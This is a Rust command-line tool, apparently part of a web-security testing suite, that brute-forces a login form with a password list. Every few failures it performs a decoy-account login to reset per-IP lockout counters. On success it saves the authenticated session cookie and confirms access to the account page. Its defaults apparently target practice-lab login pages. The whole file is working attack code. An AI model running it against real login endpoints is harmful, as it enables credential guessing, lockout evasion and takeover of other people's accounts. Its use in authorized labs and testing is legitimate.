#!/usr/bin/env rust-script
//! name: login_brute
//! description: 顺序口令爆破件(带诱饵重置)- 用候选口令逐个 POST 登录表单,按 --reset-every 个失败插入一次诱饵账号的成功登录把"失败计数"清零,绕开按 IP 计的封禁;命中即停,把会话 cookie 写回 jar 并复验账户页,一个信封给出中选口令、尝试数、诱饵数与封禁迹象
//! version: 1.0.1
//! args: <url> --user U (--passwords FILE | --pass-list 'a,b,c') [--decoy U:P] [--reset-every N] [--jar PATH] [--field-user username] [--field-pass password] [--fail-marker S] [--block-marker S] [--extra k=v]... [--confirm-path /my-account] [--snippet N] [--timeout-ms N] [--selftest]
//! keywords: 漏洞猎手套件, 爆破, 口令, 认证, brute, password, login, ip-block, 诱饵重置
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::time::{Duration, Instant};
use url::Url;

type Jar = BTreeMap<String, BTreeMap<String, String>>;

struct Cfg {
    url: String,
    user: String,
    passwords: Vec<String>,
    decoy: Option<(String, String)>,
    reset_every: usize,
    jar_path: Option<String>,
    field_user: String,
    field_pass: String,
    fail_marker: String,
    block_marker: String,
    extra: Vec<(String, String)>,
    confirm_path: Option<String>,
    snippet: usize,
    timeout_ms: u64,
}

struct Reply {
    status: u16,
    location: String,
    set_cookies: Vec<String>,
    body: String,
    transport_err: Option<String>,
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut cfg = Cfg {
        url: String::new(),
        user: String::new(),
        passwords: Vec::new(),
        decoy: None,
        reset_every: 2,
        jar_path: None,
        field_user: "username".to_string(),
        field_pass: "password".to_string(),
        fail_marker: "Incorrect password".to_string(),
        block_marker: "too many incorrect login attempts".to_string(),
        extra: Vec::new(),
        confirm_path: Some("/my-account".to_string()),
        snippet: 200,
        timeout_ms: 20000,
    };
    let mut pass_file: Option<String> = None;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--user" => { i += 1; cfg.user = arg(&args, i); }
            "--passwords" => { i += 1; pass_file = Some(arg(&args, i)); }
            "--pass-list" => {
                i += 1;
                cfg.passwords.extend(split_list(&arg(&args, i)));
            }
            "--decoy" => {
                i += 1;
                if let Some((u, p)) = arg(&args, i).split_once(':') {
                    cfg.decoy = Some((u.trim().to_string(), p.trim().to_string()));
                }
            }
            "--reset-every" => { i += 1; cfg.reset_every = arg(&args, i).parse().unwrap_or(2).max(1); }
            "--jar" => { i += 1; cfg.jar_path = Some(arg(&args, i)); }
            "--field-user" => { i += 1; cfg.field_user = arg(&args, i); }
            "--field-pass" => { i += 1; cfg.field_pass = arg(&args, i); }
            "--fail-marker" => { i += 1; cfg.fail_marker = arg(&args, i); }
            "--block-marker" => { i += 1; cfg.block_marker = arg(&args, i); }
            "--extra" => {
                i += 1;
                if let Some((k, v)) = arg(&args, i).split_once('=') {
                    cfg.extra.push((k.trim().to_string(), v.trim().to_string()));
                }
            }
            "--confirm-path" => { i += 1; cfg.confirm_path = Some(arg(&args, i)); }
            "--snippet" => { i += 1; cfg.snippet = arg(&args, i).parse().unwrap_or(200); }
            "--timeout-ms" => { i += 1; cfg.timeout_ms = arg(&args, i).parse().unwrap_or(20000); }
            other if !other.starts_with("--") && cfg.url.is_empty() => cfg.url = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if let Some(path) = pass_file {
        match std::fs::read_to_string(&path) {
            Ok(text) => cfg.passwords.extend(
                text.lines()
                    .map(str::trim)
                    .filter(|l| !l.is_empty() && !l.starts_with('#'))
                    .map(String::from),
            ),
            Err(e) => {
                pi_rust_lib::report::failure("login_brute", &format!("cannot read --passwords {path}: {e}"), "fix the path");
                std::process::exit(2);
            }
        }
    }
    if cfg.url.is_empty() || cfg.user.is_empty() || cfg.passwords.is_empty() {
        pi_rust_lib::report::failure(
            "login_brute",
            "missing url/--user/--passwords",
            "usage: login_brute <url> --user U (--passwords FILE | --pass-list 'a,b') [--decoy U:P] [--reset-every N] [--jar PATH]",
        );
        std::process::exit(2);
    }

    // One serial agent: order matters - the decoy login must land between the
    // target's failures, so every request has to be observed before the next.
    let agent = ureq::AgentBuilder::new()
        .timeout(Duration::from_millis(cfg.timeout_ms))
        .redirects(0)
        .build();
    let mut jar: Jar = cfg.jar_path.as_deref().map(load_jar).unwrap_or_default();

    let started = Instant::now();
    let mut attempts = 0usize;
    let mut decoys = 0usize;
    let mut blocked = 0usize;
    let mut transport_errors = 0usize;
    let mut failures: Vec<String> = Vec::new();
    let mut hit: Option<Value> = None;
    let mut status_hist: BTreeMap<String, usize> = BTreeMap::new();
    let mut tail: Vec<Value> = Vec::new();

    // Reset whatever counter the current session/IP carries before the first try.
    if cfg.decoy.is_some() {
        let _ = decoy_login(&agent, &cfg, &mut jar, cfg.snippet, &mut tail, &mut transport_errors);
        decoys += 1;
    }

    'outer: for pw in &cfg.passwords {
        let cookie = cookie_header(&jar, &cfg.url);
        let mut body_pairs = cfg.extra.clone();
        body_pairs.push((cfg.field_user.clone(), cfg.user.clone()));
        body_pairs.push((cfg.field_pass.clone(), pw.clone()));
        let reply = post(&agent, &cfg.url, &body_pairs, &cookie, &cfg.extra, cfg.timeout_ms);
        attempts += 1;
        if let Some(e) = &reply.transport_err {
            transport_errors += 1;
            failures.push(format!("{pw}: transport {e}"));
            continue;
        }
        let set: Vec<(String, String)> = reply.set_cookies.iter().filter_map(|c| split_cookie(c)).collect();
        apply_setcookies(&mut jar, &cfg.url, &set);
        *status_hist.entry(reply.status.to_string()).or_insert(0) += 1;

        if !cfg.block_marker.is_empty() && reply.body.to_lowercase().contains(&cfg.block_marker.to_lowercase()) {
            blocked += 1;
            if tail.len() < 60 {
                tail.push(json!({"kind": "blocked", "password": pw, "snippet": collapse(&reply.body, cfg.snippet)}));
            }
            continue;
        }

        if is_hit(reply.status, &reply.body, &cfg.fail_marker) {
            hit = Some(json!({
                "password": pw,
                "status": reply.status,
                "location": reply.location,
                "set_cookie_names": set.iter().map(|(k, _)| k.clone()).collect::<Vec<_>>(),
                "snippet": collapse(&reply.body, cfg.snippet),
            }));
            if tail.len() < 60 {
                tail.push(json!({"kind": "hit", "password": pw, "status": reply.status, "location": reply.location}));
            }
            break 'outer;
        }
        if tail.len() < 60 {
            tail.push(json!({"kind": "fail", "password": pw, "status": reply.status}));
        }

        if cfg.decoy.is_some() && attempts % cfg.reset_every == 0 {
            decoy_login(&agent, &cfg, &mut jar, cfg.snippet, &mut tail, &mut transport_errors);
            decoys += 1;
        }
    }

    let mut confirm = Value::Null;
    let mut jar_updated = false;
    if hit.is_some() {
        if let (Some(path), Some(_jar_path)) = (cfg.confirm_path.as_deref(), cfg.jar_path.as_deref()) {
            let cookie = cookie_header(&jar, &cfg.url);
            let target = match Url::parse(&cfg.url) {
                Ok(mut u) => {
                    u.set_path(path);
                    u.set_query(None);
                    u.to_string()
                }
                Err(_) => format!("{}{}", cfg.url.trim_end_matches('/'), path),
            };
            let follow = ureq::AgentBuilder::new()
                .timeout(Duration::from_millis(cfg.timeout_ms))
                .redirects(2)
                .build();
            let reply = get(&follow, &target, &cookie, &cfg.extra);
            confirm = json!({
                "path": path,
                "status": reply.status,
                "final_snippet": collapse(&reply.body, cfg.snippet),
            });
        }
        if let Some(jar_path) = cfg.jar_path.as_deref() {
            if let Ok(text) = pi_rust_lib::serde_json::to_string(&jar) {
                jar_updated = std::fs::write(jar_path, text).is_ok();
            }
        }
    }

    let data = json!({
        "url": cfg.url,
        "user": cfg.user,
        "candidates": cfg.passwords.len(),
        "attempts": attempts,
        "decoys": decoys,
        "reset_every": cfg.reset_every,
        "blocked_responses": blocked,
        "transport_errors": transport_errors,
        "elapsed_ms": started.elapsed().as_millis() as u64,
        "status_histogram": status_hist.iter().map(|(k, v)| json!({"status": k, "count": v})).collect::<Vec<_>>(),
        "hit": hit,
        "confirm": confirm,
        "jar_updated": jar_updated,
        "tail": tail,
        "failed_first": failures.iter().take(5).cloned().collect::<Vec<_>>(),
    });
    if data["hit"].is_null() {
        pi_rust_lib::report::success(
            "login_brute",
            data,
            "no candidate matched; check --fail-marker against the real error text, add candidates, or increase --reset-every safety (lower N) if blocked_responses > 0",
        )
        .expect("report success");
    } else {
        pi_rust_lib::report::success(
            "login_brute",
            data,
            "confirm/account page proves the credential; the jar now holds the authenticated session - keep going via http_session --jar",
        )
        .expect("report success");
    }
}

fn decoy_login(
    agent: &ureq::Agent,
    cfg: &Cfg,
    jar: &mut Jar,
    snippet: usize,
    tail: &mut Vec<Value>,
    transport_errors: &mut usize,
) {
    let Some((u, p)) = cfg.decoy.clone() else { return };
    let cookie = cookie_header(jar, &cfg.url);
    let mut pairs = cfg.extra.clone();
    pairs.push((cfg.field_user.clone(), u.clone()));
    pairs.push((cfg.field_pass.clone(), p));
    let reply = post(agent, &cfg.url, &pairs, &cookie, &cfg.extra, cfg.timeout_ms);
    if let Some(e) = &reply.transport_err {
        *transport_errors += 1;
        tail.push(json!({"kind": "decoy", "user": u, "transport": e}));
        return;
    }
    let set: Vec<(String, String)> = reply.set_cookies.iter().filter_map(|c| split_cookie(c)).collect();
    apply_setcookies(jar, &cfg.url, &set);
    tail.push(json!({
        "kind": "decoy",
        "user": u,
        "status": reply.status,
        "location": reply.location,
        "snippet": collapse(&reply.body, snippet),
    }));
}

fn arg(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn split_list(raw: &str) -> Vec<String> {
    raw.split(|c: char| c == ',' || c.is_whitespace())
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(String::from)
        .collect()
}

/// A 3xx after the credential POST is the success redirect; otherwise success is
/// the absence of the rendered failure marker.
fn is_hit(status: u16, body: &str, fail_marker: &str) -> bool {
    if (300..400).contains(&status) {
        return true;
    }
    !fail_marker.is_empty() && !body.contains(fail_marker)
}

fn collapse(text: &str, limit: usize) -> String {
    let one: String = text.split_whitespace().collect::<Vec<_>>().join(" ");
    if one.len() > limit {
        format!("{}...", &one[..limit.min(one.len())])
    } else {
        one
    }
}

fn form_body(pairs: &[(String, String)]) -> String {
    pairs
        .iter()
        .map(|(k, v)| format!("{}={}", urlencode(k), urlencode(v)))
        .collect::<Vec<_>>()
        .join("&")
}

fn urlencode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

fn post(
    agent: &ureq::Agent,
    url: &str,
    pairs: &[(String, String)],
    cookie: &str,
    headers: &[(String, String)],
    _timeout_ms: u64,
) -> Reply {
    let mut req = agent.post(url).set("Content-Type", "application/x-www-form-urlencoded");
    if !cookie.is_empty() {
        req = req.set("Cookie", cookie);
    }
    for (k, v) in headers {
        req = req.set(k, v);
    }
    match req.send_string(&form_body(pairs)) {
        Ok(r) | Err(ureq::Error::Status(_, r)) => read(r),
        Err(e) => Reply {
            status: 0,
            location: String::new(),
            set_cookies: Vec::new(),
            body: String::new(),
            transport_err: Some(e.to_string()),
        },
    }
}

fn get(agent: &ureq::Agent, url: &str, cookie: &str, headers: &[(String, String)]) -> Reply {
    let mut req = agent.get(url);
    if !cookie.is_empty() {
        req = req.set("Cookie", cookie);
    }
    for (k, v) in headers {
        req = req.set(k, v);
    }
    match req.call() {
        Ok(r) | Err(ureq::Error::Status(_, r)) => read(r),
        Err(e) => Reply {
            status: 0,
            location: String::new(),
            set_cookies: Vec::new(),
            body: String::new(),
            transport_err: Some(e.to_string()),
        },
    }
}

fn read(r: ureq::Response) -> Reply {
    let status = r.status();
    let location = r.header("Location").unwrap_or("").to_string();
    let set_cookies: Vec<String> = r.all("Set-Cookie").iter().map(|s| s.to_string()).collect();
    let body = r.into_string().unwrap_or_default();
    Reply { status, location, set_cookies, body, transport_err: None }
}

fn host_of(url: &str) -> String {
    Url::parse(url).ok().and_then(|u| u.host_str().map(String::from)).unwrap_or_default()
}

fn cookie_header(jar: &Jar, url: &str) -> String {
    let host = host_of(url);
    let mut parts = Vec::new();
    for (h, cookies) in jar {
        if host == *h || host.ends_with(&format!(".{h}")) || h.ends_with(&host) {
            for (k, v) in cookies {
                parts.push(format!("{k}={v}"));
            }
        }
    }
    parts.join("; ")
}

fn apply_setcookies(jar: &mut Jar, url: &str, pairs: &[(String, String)]) -> bool {
    if pairs.is_empty() {
        return false;
    }
    let host = host_of(url);
    let key = jar
        .keys()
        .find(|h| **h == host || host.ends_with(&format!(".{h}")) || h.ends_with(&host))
        .cloned()
        .unwrap_or(host);
    let entry = jar.entry(key).or_default();
    for (k, v) in pairs {
        entry.insert(k.clone(), v.clone());
    }
    true
}

fn split_cookie(raw: &str) -> Option<(String, String)> {
    let first = raw.split(';').next()?.trim();
    let (k, v) = first.split_once('=')?;
    Some((k.trim().to_string(), v.trim().to_string()))
}

fn load_jar(path: &str) -> Jar {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|s| pi_rust_lib::serde_json::from_str::<Value>(&s).ok())
        .and_then(|v| match v {
            Value::Object(hosts) => Some(
                hosts
                    .into_iter()
                    .map(|(h, c)| {
                        let map = c
                            .as_object()
                            .map(|o| o.iter().map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string())).collect())
                            .unwrap_or_default();
                        (h, map)
                    })
                    .collect(),
            ),
            _ => None,
        })
        .unwrap_or_default()
}

fn selftest() {
    let list_ok = split_list("a, b c\n") == vec!["a".to_string(), "b".to_string(), "c".to_string()];
    let body_ok = form_body(&[("username".into(), "user1".into()), ("password".into(), "a b".into())])
        == "username=user1&password=a%20b";
    let oracle_ok = is_hit(302, "", "Incorrect password")
        && !is_hit(200, "<p>Incorrect password</p>", "Incorrect password")
        && is_hit(200, "Log out", "Incorrect password");
    let mut jar: Jar = BTreeMap::new();
    jar.insert("lab.example.net".to_string(), [("session".to_string(), "a".to_string())].into_iter().collect());
    let ch_ok = cookie_header(&jar, "https://lab.example.net/login") == "session=a";
    let jar_ok = apply_setcookies(&mut jar, "https://lab.example.net/login", &[("session".into(), "b".into())])
        && jar["lab.example.net"]["session"] == "b";
    let split_ok = split_cookie("session=zz; Secure") == Some(("session".to_string(), "zz".to_string()));
    let collapse_ok = collapse("a\n b", 10) == "a b";
    let host_ok = host_of("https://lab.example.net/login") == "lab.example.net";
    let receipt = list_ok && body_ok && oracle_ok && ch_ok && jar_ok && split_ok && collapse_ok && host_ok;
    let data = json!({
        "selftest": if receipt {"ok"} else {"fail"},
        "pass_list": list_ok,
        "form_body": body_ok,
        "oracle": oracle_ok,
        "cookie_header": ch_ok,
        "jar_writeback": jar_ok,
        "split_cookie": split_ok,
        "collapse": collapse_ok,
        "host": host_ok,
    });
    if receipt {
        pi_rust_lib::report::success("login_brute", data, "selftest passed; run against the login endpoint").expect("report");
    } else {
        pi_rust_lib::report::failure("login_brute", "selftest failed", "inspect the failing assertion flags");
        std::process::exit(1);
    }
}
